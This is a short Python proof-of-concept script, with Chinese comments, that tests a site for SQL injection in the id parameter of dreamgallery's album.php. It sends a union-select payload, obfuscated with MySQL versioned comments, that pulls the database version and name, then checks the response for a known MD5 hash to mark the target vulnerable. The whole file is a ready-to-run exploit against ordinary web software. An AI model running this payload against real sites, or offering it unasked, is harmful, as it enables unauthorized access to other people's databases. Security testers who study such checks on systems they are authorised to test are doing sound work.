#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: dreamgallery album.php SQL注入
referer: unknown
author: Lucifer
description: 文件album.php中,参数id存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['dreamgallery album.php SQL注入', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/dream/album.php?id=-1+/*!12345union*/+/*!12345select*/+1,group_concat(version(),0x3a,md5(1234),0x3a,database()),3,4,5,6,7,8,9,10--+"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
